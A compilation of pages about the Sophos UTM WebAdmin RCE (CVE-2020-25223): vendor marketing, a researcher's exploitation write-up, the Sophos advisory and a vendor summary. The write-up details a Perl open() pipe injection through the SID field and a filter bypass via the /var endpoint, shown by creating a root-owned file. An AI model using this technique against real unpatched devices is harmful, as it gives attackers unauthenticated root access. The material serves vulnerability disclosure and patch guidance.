### Take Patch Management Miles Ahead with the Industry Leading Patching Capabilities

 Automate Patching for Faster Deployment

Manual patching cycles are tedious and time-consuming. With the SanerNow automated patch management tool, configure end-to-end workflows for automatic patching and fix risks faster than ever. Schedule automated patching tasks and make patching a hands-free task. It also supports the upload of pre and post-remediation scripts.

 Test and Approve Patches for Zero-Disruption

Applying new patches directly to the production environment is risky. SanerNow patch management software enables you to create a test environment to test the new patches to verify compatibility. Later, deploy the approved patches across the devices in your production environment and prevent any disruptions and productivity errors.

 Perimeter-Less Patching with a Single, light-weight Agent

SanerNow auto patching software is an ideal solution for hybrid workforces. You can easily deploy patches across globally distributed devices from a centralized cloud patch management solution. Furthermore, all the patching tasks, from scanning to deployment, are executed by a single lightweight multifunctional agent installed in the endpoints. You can also go for the agent-less option, which is a unique approach to scanning while retaining the scan speed and accuracy.

 Risk based Prioritization to Deploy Patches Smartly

SanerNow auto patching tool thoroughly assesses the patches and prioritizes them based on their business context, technical impact, severity level, and more intelligence to help focus on critical patches immediately. Additionally, you can deploy these patches quickly to reduce risk exposure and plan your remediation efforts wisely.

 Firmware Patches for Complete Risk Mitigation

As important as the software application patches, firmware patches are critical to tightening IT security. Moreover, it is recommended to include firmware patching as you establish your automated patch management cadence to reduce security risk exposure. SanerNow patch manager supports patching for firmware updates to fix issues and errors in firmware.

 Continuous and Customizable Patch Scans to Identify Missing Patches

Move away from the periodic scans and make it a continuous process with SanerNow patch management software. Keep your patching up-to-date with customized, real-time, and continuous scans for verified patches based on your IT environment. You can additionally perform real-time, on-demand, scheduled, and automated patch scans with the SanerNow patch management tool.

 Cross-Platform Patching with Support for Third-Party Apps

SanerNow patch management tool supports multi-platform patching for all major operating systems like Windows, macOS, Linux, and 550+ third-party applications. SanerNow’s automated patching solution additionally maintains a pre-built patch repository for third-party application patches.

 Effortless Patch Rollback for an Error-Prone Patching

Patch rollback is made easier with the SanerNow automated patch management tool to avoid disruptions in business operations. It rollbacks the last stable version with zero downtime and a single click to easily deal with incompatible and error-prone software patches.

 Comply with Industry Benchmarks and Security Standards

Various industry regulatory standards and organizations mandate patch compliance. SanerNow auto patch management software provides a unified view of your software patch compliance to address deviations from compliance standards and deploy patches accordingly. However, with auto patching in SanerNow, you can quickly fix the misconfigurations and achieve compliance with regulatory standards.

 Insights and Tracking with Reports and Audit Logs

Track detailed insights on your patching metrics with auto-generated reports and an inbuilt audit log. SanerNow automated patch management software provides a wide range of reports to assess the patching status in your network. Additionally, SanerNow provides an insightful Patch Impact Report to analyze the impact of patches and track the patching activities.

![](https://www.secpod.com/wp-content/uploads/2024/06/Asset-12@4x-8-1024x954-3.webp)

*“SanerNow’s patch management capabilities stand out from the competition since it can patch all the discovered vulnerabilities and perform other system-hardening actions. Even if no direct remediation is available, SanerNow applies security controls that provide workarounds for the* *vulnerabilities.”*

**– Swetha Krishnamoorthi, Senior Industry Analyst, Cybersecurity, Frost & Sullivan**

* Comprehensive microscopic view of your IT infrastructure
* Complete automation of tasks like scanning, remediation end-to-end
* Harness the world’s first CISA’s SSVC-based risk prioritization framework
* Support a built-in vulnerability mitigation engine to remediate risks.

#### How is SanerNow Vulnerability Management priced and licensed?

SanerNow Vulnerability Management is licensed as an annual subscription based on the number of assets instead of the IP address.
For pricing information, contact us.

#### How is the vulnerability scoring and prioritization process used in SanerNow?

SanerNow Vulnerability Management uses the industry standard CVSS scoring in combination with its own proprietary scoring system to help prioritize and remediate security risks better.

Further, in the SanerNow Continuous Vulnerability & Exposure Management suite, SanerNow Risk Prioritization uses the CISA’s SSVC framework in combination with an improved EPSS model to combine asset criticality, business impact, exploitation, and more to prioritize risks effectively.

#### What is the typical onboarding process for SanerNow?

The typical onboarding and implementation of SanerNow is a simple and quick process. On the Basis of the type of implementation, be it cloud or on-premise, the onboarding process slightly changes. But here is a general overview of the process:

* + Initially, the administrator accounts are set up for all the users with higher privilege and provides complete control over the network.
  + Once set up, Saner Agents are distributed into your organization’s devices based on different methods like Active Directory or manually importing the users. You can choose which set of devices to install.
  + And that’s it, you are done. After the agents are installed, they automatically scan the devices, and you jump right into it!

# Sophos UTM Preauth RCE: A Deep Dive into CVE-2020-25223

Aug 18

Written By [Justin Kennedy](/blog?author=611d0c015866e41d2563820c)

Note: Sophos fixed this issue in September 2020. Information about patch availability is in their [security advisory](https://www.sophos.com/en-us/security-advisories/sophos-sa-20200918-sg-webadmin-rce).

## Overview

On a recent client engagement I was placed in a Virtual Private Cloud (VPC) instance with the goal of gaining access to other VPCs. During enumeration of attack surface I came across a Sophos UTM 9 device:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629294755420-0JN5PLA0CHD6WQNKKCBD/splash.png)

When reviewing known vulnerabilities in these Sophos UTM devices, I came across `CVE-2020-25223`. The only information I could find about this vulnerability was that it was an unauthenticated remote command execution bug that affected several versions of the product:

> A remote code execution vulnerability exists in the WebAdmin of Sophos SG UTM before v9.705 MR5, v9.607 MR7, and v9.511 MR11

After confirming with our client that they were running a vulnerable version, I posted to Twitter and a couple Slacks to see if anyone had any details on the vulnerability, and then set off on what I thought would be a quick adventure, but turned out not to be so quick in the end.

This blog post tells the story of that adventure and how in the end I was able to identify the preauth RCE.

## Use the ~~force~~ Diffs, ~~Luke~~ Justin.

When looking for the details on a known patched bug, I started off the same way any sane person would, comparing the differences between an unpatched version and a patched version.

I grabbed ISOs for versions `9.510-5` and `9.511-2` of the Sophos UTM platform and spun them up in a lab environment. Truth be told I ended up spinning up six different versions, but the two I mentioned were what I ended up comparing in the end.

## Enabling Remote Access

A nice feature on the Sophos UTM appliances is that once the instance is spun up, you can enable SSH, import your keys, and access the device as root using the Management -> System Settings -> Shell Access functionality in the web interface:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629294833996-T44SYXMH78WRFVFRRQ6X/shell-access-web-interface.png)

Then it's just a matter of SSH'ing into the instance:

```
$ ssh root@192.168.50.15
Last login: Mon Aug 16 14:37:00 2021 from 192.168.50.178

```
## Where's the code?

I proxied all web traffic to the instances through Burp and found that the `webadmin.plx` endpoint handles a majority of the incoming web traffic. For instance, the following HTTP POST request is made when navigating to the instance, unauthenticated:

```
POST /webadmin.plx HTTP/1.1
Host: 192.168.50.15:4444
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Referer: https://192.168.50.15:4444/

{"objs": [{"FID": "init"}], "SID": 0, "browser": "gecko_linux", "backend_version": -1, "loc": "", "_cookie": null, "wdebug": 0, "RID": "1629216182300_0.6752239026892818", "current_uuid": "", "ipv6": true}
```

On the device we can see that `webadmin.plx` is indeed running:

```
sophos:/root # ps aux | grep -i webadmin.plx
wwwrun   12685  0.4  1.0  93240 89072 ?        S    11:22   0:08 /var/webadmin/webadmin.plx
```

It turns out the webserver is actually running chroot'd in `/var/sec/chroot-httpd/`, so that's where we can find the file:

```
# ls /var/sec/chroot-httpd/var/webadmin/webadmin.plx
/var/sec/chroot-httpd/var/webadmin/webadmin.plx
```

Not being familiar with the `.plx` file format, I used `file` to see what I was dealing with:

```
# file webadmin.plx
webadmin.plx: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped
```

Huh, ok...I was hoping for something easy like some PHP or Python or something. After poking at the ELF for a while and digging around online I came across the following writeup (I don't know where the original is, I'm sorry):

<https://paper.seebug.org/1397/>

It seems like I'm not the first person to assess one of these devices, and honestly, this writeup probably saved me several more hours of poking around. The gist of the writeup is that the author found that the `.plx` files are Perl files that have been compiled using ActiveState's Perl Dev Kit and that you can access the original source by running the `.plx` file in a debugger, setting a break point, and recovering the script from memory.

I went through this process and it worked surprisingly well. Note for the author of the writeup: you can use an SSH tunnel to hit the IDA debugger running on the Sophos UTM instance.

## Ok... but where's the rest of the code...?

At this point I had access to the `webadmin.plx` code (which is actually `asg.plx` and is actually Perl code) which was great, but there was a big problem: the `asg.plx` file isn't a massive file with all of the code. I needed access to the Perl modules that `asgx.plx` imports, like:

```
# astaro stuff ---------------------------------------------
use Astaro::Logdispatcher;
use Astaro::Time::Zone qw/lgdiff/;

# necessary core modules -----------------------------------
use core::modules::core_globals;
use core::modules::core_tools;

**asg.plx:20-26**

I wish I could say I was able to get access to this code quickly and easily, and in the end it was as simple as extracting it with the right tools, but I didn't know that at the time and I stumbled and crawled a great distance along the way.

I was able to confirm that the modules that were imported by `asg.plx` would be accessible by taking memory dumps of the process and using strings to find bits and pieces of code, so on the bright side, the code was definitely there.

After a couple late nights of trying different things like extracting code from memory dumps, patching the binaries, etc... I posted the problem and the `webadmin.plx` file in work chat. There were great suggestions on using `LD_PRELOAD` on `libperl.so` or using binary instrumentation with `frida` or `PIN` to get access to the source code, but then one of our great reverse engineers found that the file actually had a BFS filesystem embedded at the end of the ELF file, and in a couple minutes was able to put together a script that could then be used with `https://github.com/the6p4c/bfs_extract` to extract the filesystem (and with that, the source).

The script can be found here:

```
import sys
import struct

class BFS:
  def __init__(self, data):
    self.data = data

  @classmethod
  def open(cls, path):
    with open(path, 'r+b') as f:
      f.seek(-12, 2)
      magic_chunk = f.read(12)
      pointer_header = struct.unpack('<III', magic_chunk)
      assert(pointer_header[0] == 0xab2155bc)

      f.seek(-12 - pointer_header[2], 2)
      data = f.read(pointer_header[2])
      return cls(data)

bfs = BFS.open(sys.argv[1])
with open(sys.argv[2], 'wb') as outf:
  outf.write(bfs.data)
```

**yank.py**

Using it is fairly straight forward:

```
#!/bin/bash

python3 ~/tools/bfs_extract/yank.py $1 stage1-$1
python3 ~/tools/bfs_extract/bfs.py stage1-$1 stage2-$1
python3 ~/tools/bfs_extract/bfs_extract.py stage2-$1 $2
```

**bfs\_extract.sh**

```
$ bfs_extract.sh webadmin.plx extracted/

    Offset: 1b8a4

```

Watching the thousands of source files extracting from the `.plx` file was beautiful, I almost cried tears of joy.

## Back to the Diffs

I spent a fair amount of time extracting the source code out of the `.plx` files from the UTM instances and also pulled the entire `/var/sec/chroot-httpd/` directory to capture any differences in configuration files. My tool of choice for reviewing diffs is [Meld](http://meldmerge.org/) as it lets me quickly and visually review diffs of directories and files:

Between the versions, the only change was in the `wfe/asg/modules/asg_connector.pm` file:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629294977782-BSKS5PSGY84YKTBZP9GD/meld-dir-structure.png)

The change in this file can be seen in meld below:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629296466097-R09POIHOYS1XO8QU4G34/meld-asg-connector.png)

The updated code shows a check being added to the `switch_session` subroutine make sure the `SID` (Session ID) does not contain any other characters other than alphanumeric characters; so it's likely that the vulnerability sources from the value of `SID`.

## Going Down the Rabbit Hole

The only place the `switch_session` subroutine is called is from the `do_connect` subroutine:

```
$ ag switch_session
wfe/asg/modules/asg_connector.pm
68:# just a wrapper for switch_session
71:  return $self->switch_session(@_);
76:sub switch_session {
81:  &main::msg('d', "Called " . __PACKAGE__ . "::switch_session()");
```

The `do_connect` subroutine just appears to be a wrapper for the `switch_session` subroutine:

```
# just a wrapper for switch_session
sub do_connect {
  my $self = shift;
  return $self->switch_session(@_);
}
```

**wfe/asg/modules/asg\_connector.pm:68-72**

The `do_connect` subroutine is used in various places in the code:

```
$ ag do_connect
wfe/asg/modules/asg_login.pm
290:    $SID = $sys->do_connect($config->{backend_address});

wfe/asg/modules/asg_misc.pm
110:  $SID = $sys->do_connect($config->{backend_address},$vars->{SID}) if $vars->{SID};

wfe/asg/modules/asg_main.pm
55:      $SID = $sys ? $sys->do_connect($config->{backend_address}, $_cookies->{SID}->value) : undef;

wfe/asg/modules/asg_connector.pm
69:sub do_connect {

core/modules/core_connector.pm
30:# renamed connect to do_connect for avoid confusion with
32:sub do_connect {
33:  die __PACKAGE__ . '::do_connect() has to be implemented by inherting module!';

asg.plx
190:    $SID = $sys ? $sys->do_connect($config->{backend_address}, $req->{SID}) : undef;
216:    $SID = $sys ? $sys->do_connect($config->{backend_address}, $req->{SID}) : undef;
325:          if ( $cookies->{SID} and ( $cookies->{SID} eq $SID or $SID = $sys->do_connect($config->{backend_address}, $cookies->{SID}) ) ) {
```

Knowing that `asg.plx` is the script name of `webadmin.plx`, let's take a look there first:

```
# POST request - means JSON request
  if ( $ENV{'REQUEST_METHOD'} eq 'POST' ) {

    # no further processing in case of content-type violation
    goto REQ_OUTPUT if $req->{ct_violation};

    # switch our identity if necessary
    $SID = $sys ? $sys->do_connect($config->{backend_address}, $req->{SID}) : undef;
```

**asg.plx:209-216**

The `do_connect` subroutine is used at the start of the HTTP POST request handling and also takes `SID` so we should be able to hit it with any HTTP POST request.

Throughout the code there are references to `confd` which is a backend service that the `httpd` frontend communicates with over RPC. When making an HTTP POST request to `webadmin.plx`, the `httpd` service connects to `confd` and sends it some data, such as `SID`, that's what we are seeing with:

```
$SID = $sys ? $sys->do_connect($config->{backend_address}, $req->{SID}) : undef;
```

So when an HTTP POST request is made, the `SID` is sent to `confd` where it is checked to see if it's a valid session identifier. This can be seen in the log files in `/var/log/` on the appliance. If we make the following request with an invalid `SID`:

```
POST /webadmin.plx HTTP/1.1
Host: 192.168.50.17:4444
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

```

Then we can see the lookup happen in the `/var/log/confd-debug.log` log file. The `confd` calls `get_SID` with the user-supplied `SID`:

```

**/var/log/confd-debug.log**

The `confd` service responds back to the `httpd` service that the `SID` does not exist and we can see that error occur in the `/var/log/webadmin.log` log file:

```
2021:08:17-15:23:14 sophos9-510-5-1 webadmin[32509]: |=========================================================================
2021:08:17-15:23:14 sophos9-510-5-1 webadmin[32509]: W No backend for SID = ATREDIS...

2021:08:17-15:23:14 sophos9-510-5-1 webadmin[32509]:  1. main::top-level:221() asg.plx
```

**/var/log/webadmin.log**

Let's see what exactly happens with the `SID` value that we supply in our HTTP POST request. When the connection to `confd` is made, `confd` attempts to read the stored `SID` from the `confd` sessions directory at `$config::session_dir` (`/var/confd/var/sessions`):

```
my $new = read_storage("$config::session_dir/$session->{SID}");
```

**Session.pm:189**

The `read_storage` subroutine takes a `$file` which in this case is `SID` and passes it to the `Storable::lock_retrieve` subroutine:

```
# read from Perl Storable file
sub read_storage {
  my $file = shift;
  my $href;

  require Storable;
  eval { local $SIG{'__DIE__'}; $href = Storable::lock_retrieve($file); };
  return if $@;
  return unless ref $href eq 'HASH';

  return $href;
}
```

**Astaro/file.pm:350-361**

The `lock_retrieve` subroutine calls the `_retrieve` subroutine:

```
sub lock_retrieve {
    _retrieve($_[0], 1);
}
```

**auto/Storable/lock\_retrieve.al:12-14**

The `_retrieve` subroutine then calls `open()` on the file:

```
sub _retrieve {
    my ($file, $use_locking) = @_;
    local *FILE;
    open(FILE, $file) || logcroak "can't open $file: $!";
```

**auto/Storable/\_retrieve.al:8-11**

In Perl, `open()` can be a dangerous function when user-supplied data is passed as the second argument. You can learn more about this in Perl's official documentation [here](https://perldoc.perl.org/5.8.9/perlopentut), but this quick example demonstrates the danger:

```
#!/usr/bin/perl

my $a = "|id";
local *FILE;

open(FILE, $a);
```

**test.pl**

```
$ perl test.pl
uid=1000(justin) gid=1000(justin) groups=1000(justin)
```

In the case of the UTM appliance, the user-supplied `SID` value is passed to the second argument of `open()`. That seems pretty straight forward to exploit, right? Let's give it a shot. We'll attempt to run the command `touch /tmp/pwned`:

```

Now let's check for our file!

```
# ls -l /tmp/pwned
ls: cannot access /tmp/pwned: No such file or directory
```

Erm. No file has been written to the `/tmp/` directory. When I got to this point, I was frustrated, let me tell you.

Let's look into the logs and see if we can figure out what happened.

Hmm... The `SID` in the logs is `0ouch /tmp/pwned`, that's not what we sent...

## Say Diff Again!

At this point I knew exactly what the issue was. Remember at the beginning of this writeup when I said that I like to diff both source code *and* configuration files? Meet the other diff between versions:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629295276088-ID49ZBYDBETVRW6CQGGP/meld-httpd-conf.png)

Reviewing the `httpd-webadmin.conf` configuration file in `/var/chroot-httpd/etc/httpd/vhost` shows us this almost-show-stopper:

```
<LocationMatch webadmin.plx>
        AddInputFilter sed plx
        InputSed "s/\"SID\"[ \t]*:[ \t]*\"[^\"]*\|[ \t]*/\"SID\":\"0/g"
    </LocationMatch>
```

**/var/chroot-httpd/etc/httpd/vhost/httpd-webadmin.conf:64-67**

Any HTTP requests coming into `webadmin.plx` are processed by `InputSed` which matches and replaces our `"SID":"|` JSON body with `"SID":"0`. This can be visually seen on regex101.com:

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1629295334112-4L6S998RKOWXD9TW9OCP/regex101.png)

After spending some time attempting to bypass the regex and try different payloads, I had a thought... This input filter only triggers when the location matches `webadmin.plx`. And then I saw it and it was beautiful:

```
RewriteRule ^/var /webadmin.plx
```

**/var/chroot-httpd/etc/httpd/vhost/httpd-webadmin.conf:12**

Making an HTTP request to the `/var` endpoint is the same as making a request to the `/webadmin.plx` endpoint, but without the filter. Making the request again, but to the new endpoint:

```
POST /var HTTP/1.1
Host: 192.168.50.17
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

```

And here's our file:

```
# ls -l /tmp/pwned
-rw-r--r-- 1 root root 0 Aug 17 17:07 /tmp/pwned
```

We now have unauthenticated RCE on the Sophos UTM appliance as the root user.

And that ends our adventure for now. I hope you enjoyed this writeup :)

**Atredis Partners is a different kind of Information Security Company**

# Atredis is built for you.

Much of the information security industry is built on selling complex solutions to simple problems: on cookie cutter, commoditized services and replacing people with products, pounding square pegs into round holes. At Atredis Partners, you aren't a commodity. We focus instead on understanding each client's individual security needs and risk tolerance, on your specific goals and engagement drivers.

Each and every work product we create is unique, tailored to the target environment, powered by our own research and a passion to truly improve quality for our clients and partners.

We don't rely on non-technical commisioned sales teams to handle our client relationships and proposals. Instead, our research consultants and operations team work directly with you to design and plan engagements, ensuring constant and continuous client feedback, from scoping to proposal and execution.

![](https://images.squarespace-cdn.com/content/v1/576323cfd482e984e113fe9c/1472095716276-RJW37HRHX0H698IYRT3V/LIghtBulb.jpg)

**Atredis Partners is industry-leading, research-driven consulting**

At Atredis Partners, we thrive in the unknown, and nothing gets us more excited than a new client project with unique challenges and obstacles to overcome. By definition, each of our engagements is built with the client's specific objectives in mind, so if you have a specific need that isn't in this list, please [contact us](/contact)! We'd love to build a bespoke proposal to meet your needs.

## Research-Powered Penetration Testing

Our goal at Atredis from day one was to redefine [penetration testing](/pentesting). We bring one of the most well-respected security research and consulting teams in the world, blending cutting-edge security research with traditional penetration testing to deliver results that we believe are second to none in our industry.

---

## Embedded Security Assessment

In our [embedded security](/embedded) engagements, our world-class team of research consultants deliver full-scope hardware, automotive, IoT, mobile, medical and industrial security assessments at every layer of a device, from low-level reversing to firmware and embedded software exploitation.

---

## Risk and Advisory

Our [Risk and Advisory](/risk) team brings a research-driven and data-centric approach to risk management and compliance, collaborating with our other technical teams to help our clients move beyond checkboxes with a forward-looking, methodological approach to analyzing, addressing, and managing risk.

**Atredis Partners is a team of experts. Only.**

# Atredis is some of the best people in Information Security.

While our client base is by definition confidential and we often operate under strict nondisclosure agreements, Atredis Partners has delivered notable public security research on improving the security at Google, Microsoft, The Linux Foundation, Motorola, Samsung and HTC products, and were the first security research firm to be named in Qualcomm’s Product Security Hall of Fame. We’ve received four research grants from the Defense Advanced Research Project Agency (DARPA), participated in research for the CNCF (Cloud Native Computing Foundation) to advance the security of Kubernetes, worked with OSTIF (The Open Source Technology Improvement Fund) and The Linux Foundation on the Core Infrastructure Initiative to improve the security and safety of the Linux Kernel, and have identified entirely new classes of vulnerabilities in hardware, software, and the infrastructure of the World Wide Web.

To deliver work at the highest standards in our industry, we have built a team of seasoned, passionate professionals with a drive to be among the best in the world at what they do.

![Advisory: Resolved RCE in SG UTM WebAdmin (CVE-2020-25223)](https://community.sophos.com/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-51/Community-Green-800x400.png)

# Overview

A remote code execution vulnerability in the WebAdmin of SG UTM was discovered and responsibly disclosed to Sophos in 2020. It was reported via the Sophos bug bounty program by an external security researcher. The vulnerability was fixed in September 2020.

Devices that have not been updated in the last year and still have WebAdmin exposed to the WAN are vulnerable. Check this [Knowledge Base Article](https://support.sophos.com/support/s/article/KB-000042965 "Sophos UTM: CVE-2020-25223 Exploit Remediation") for additional information to determine if a device has been compromised and how to remediate.

### Applies to the following Sophos product(s) and version(s)

* Sophos SG UTM

# Remediation

* Fix included in SG UTM v9.705 MR5, v9.607 MR7, and v9.511 MR11 on September 17, 2020
* Users of older versions of SG UTM are required to upgrade to receive this fix
* Additionally, Sophos recommends that SG UTM customers upgrade to the latest available release

# Workaround

Customers can protect themselves by ensuring their WebAdmin is not exposed to WAN.

This can be achieved by keeping `Internal (LAN) (Network)` or another internal-only network definition as the sole entry in *Management→WebAdmin Settings→WebAdmin Access Configuration→Allowed Networks*.

A critical and high severity remote code execution [vulnerability](https://www.secpod.com/vulnerability-management/) CVE-2020-25223 with CVSS 3. x severe base score 9.8 is present in Sophos SG UTM. Sophos reported this vulnerability on  September 18, 2020, in their [Advisory](https://community.sophos.com/b/security-blog/posts/advisory-resolved-rce-in-sg-utm-webadmin-cve-2020-25223). A reliable [vulnerability management tool](https://www.secpod.com/patch-management/) can help to combat these vulnerabilities.

This vulnerability was present in the company’s bug bounty program by an external security researcher. As per the claim from the advisory, there was no evidence of vulnerability exploitation at the time of the release of the advisory. [Vulnerability Management software](https://www.secpod.com/patch-management/) can help reduce these attacks.

## Vulnerability CVE-2020-25223 details

* [**CVE-2020-25223**](https://www.scaprepo.com/view.jsp?id=CVE-2020-25223): A remote code execution vulnerability exists in WebAdmin of Sophos SG UTM

The vulnerability was present in the web admin of the Sophos SG UTM. The vulnerability can be easily triggering and exploited by sending an HTTP request to the devices with vulnerable versions of the affected software, which lacks proper input validation. As a result, an attacker can have **unauthenticated,** **remote code execution as a root user** on Sophos UTM.

---

## How does CVE-2020-25223 attack work?

A researcher stated in his [article](https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223) that he found that webadmin. plx endpoint handles most of the incoming web traffic, which is a Perl file. When an HTTP POST request is present, the SID(Session Identifier) goes to the confd, a back-end service, to check whether it’s a valid session identifier. The SID is supplying itself to a HTTP POST Request, and the confd attempts to read SID from confd sessions directory (/var/confd/var/sessions). Then the SID is passing as a second argument to the open() function as a file after passing through a couple of subroutines. In Perl, we must handle the open() function carefully when user-supply data is passing as the second argument. You can learn more about this in Perl’s [document](https://perldoc.perl.org/5.8.9/perlopentut).

In this case, commands are passing as SID as a second argument to open(). To bypass the regex check, replace the SID with 0 in the HTTP request before reaching the webadmin.plx, RewriteRule ^/var /webadmin.plx is in use. i.e., sending an HTTP request to /var is the same as sending the HTTP request to webadmin.plx, but in this case, the request checks is not by regex. By replacing SID in HTTP requests with commands like touch /tmp/pwned, the commands will be executed. This is how the attack can be carried out.

## Affected Versions by CVE-2020-25223

Sophos SG UTM versions before v9.705 MR5, v9.607 MR7, 9.511 MR11

---

## Workaround

The advisory does mention a workaround for users who cannot currently deploy the fixed version. It can be present by keeping Internal or another internal-only network definition as the sole entry in **Management->WebAdmin Settings->WebAdmin Access Configuration->Allowed Networks.**

---

## Solution

Finally, a fix for this vulnerability has been released in versions **v9.705 MR5, v9.607 MR7, v9.511 MR11, or later. However,** The vulnerable versions of Sophos SG UTM are in advisement to update to the latest available release.
